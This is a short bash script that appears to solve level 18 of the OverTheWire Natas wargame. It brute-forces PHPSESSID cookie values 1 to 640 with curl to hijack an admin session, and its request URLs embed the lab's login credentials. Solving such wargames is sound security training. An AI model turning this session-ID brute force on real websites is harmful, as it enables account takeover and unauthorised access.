#!/bin/bash

function hack() {
	for i in {1..640} ; do
		request $i
	done
}

function request_login() {
	curl -v \
		 -d "username=admin&password=admin" \
		 http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org?debug=debug
}
function request() {
	curl -v \
		 --cookie "$(generate-attack-string $1)" \
		 http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org?debug=debug
}

function generate-attack-string() {
	printf "PHPSESSID=$1"
}
